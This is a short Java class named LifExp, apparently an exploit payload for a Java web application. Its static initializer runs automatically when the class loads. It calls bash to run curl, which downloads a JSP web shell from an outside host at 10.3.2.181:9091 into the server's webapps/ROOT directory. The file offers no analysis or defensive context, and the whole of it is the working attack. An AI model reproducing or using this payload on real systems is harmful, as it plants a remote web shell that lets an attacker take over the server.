import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
public class LifExp {

static {

try {
            String[] cmd = {"bash", "-c", "pwd"};
            Process process=java.lang.Runtime.getRuntime().exec(cmd);
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String s= stdInput.readLine();
            String[] cmd2 = {"bash", "-c", "curl -o ../webapps/ROOT/jspshell.jsp http://10.3.2.181:9091/jspshell.jsp"};
            java.lang.Runtime.getRuntime().exec(cmd2);
        } catch ( Exception e ) {
            e.printStackTrace();
        }

}
}
